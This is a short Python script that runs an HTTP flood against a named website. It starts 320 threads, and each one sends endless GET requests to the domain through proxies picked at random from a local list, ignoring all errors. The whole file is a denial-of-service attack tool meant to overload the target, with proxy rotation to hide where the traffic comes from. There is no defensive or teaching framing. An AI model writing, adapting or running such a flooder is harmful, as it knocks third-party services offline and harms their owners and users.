from random import choice
from threading import Thread, Lock
import requests

def getRandomProxy():
	
	lolchoicehttp = choice(sesh.proxies)
	lolchoicehttps = choice(sesh.proxieS)
	rand_proxy = {"http":lolchoicehttp, "https":lolchoicehttps}
	# sesh.proxies.remove(lolchoicehttp)
	# sesh.proxieS.remove(lolchoicehttps)	
	print("[{}/http]".format(len(sesh.proxies)))
	return rand_proxy


def Connect():
	while True:
		try:
			r = sesh.get("http://mekadrage.com", proxies = getRandomProxy())
			print(r)
		except:
			pass



if __name__ == "__main__":

	sesh = requests.Session();
	sesh.proxies = list()
	sesh.proxieS = list()

	with open("lolzies.txt", "r") as proxiesHTTP:
		for line in proxiesHTTP:
			line = line.replace('\n', '')
			sesh.proxies.append(line)

	with open("lolzies.txt", "r") as proxiesHTTPS:
		for line in proxiesHTTPS:
			line = line.replace('\n', '')
			sesh.proxieS.append(line)




	threads = []

	for x in range(320):
		
		t = Thread(target=Connect)
		t.daemon = True
		t.start()
		threads.append(t)

	for t in threads:
		print(t, " [+]attempting connection(s)")
		

	print("done.")

